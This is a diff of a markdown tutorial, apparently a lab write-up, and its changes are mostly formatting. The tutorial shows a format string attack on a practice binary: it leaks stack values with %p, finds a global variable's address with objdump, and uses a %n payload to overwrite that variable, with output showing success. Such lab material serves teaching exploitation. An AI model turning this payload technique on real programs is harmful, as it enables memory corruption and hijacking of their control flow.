@@ -103,7 +103,7 @@ Output:
 0xffffd69c 0x41414141 0x20702520 0x25207025`.  
 Hey its again the same the 10th location. :metal:  
 
-Now consider,  
+Now consider,    
 `echo -e 'AAAA %p %p %p %p %p %p %p %p %p %n' | ./string1`
 This above command will write `len(AAAA %p %p %p %p %p %p %p %p %p ) --> 32` to
 to the memory pointed by the 10th argument. But the 10th argument is nothing but
@@ -114,16 +114,17 @@ buffer instead of `0x41414141`. If we do so, then %n will write to that memory
 pointed by that location.
 Why not getting the address of `myvar`. Since it is global, we can get the
 address of globals before the running the program.  
-We will use , `objdump -t ./string1 | grep myvar`    
+We will use ,  
+`objdump -t ./string1 | grep myvar`      
 `0804a028 g     O .bss	00000004              myvar`    
 The first data column contains the address for the `myvar`.   
 
 
 **Crafting the exploit** to change the variable content then change the control
-flow.
+flow.  
 `` echo -e `python -c "import struct; print struct.pack('<I',0x0804a028)"`"%p %p
-%p %p %p %p %p %p %p %n" | ./string1``
-Output:
+%p %p %p %p %p %p %p %n" | ./string1``  
+Output:  
 ``(0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e 0xffffd69c
 Cool you changed it .. :)``
 
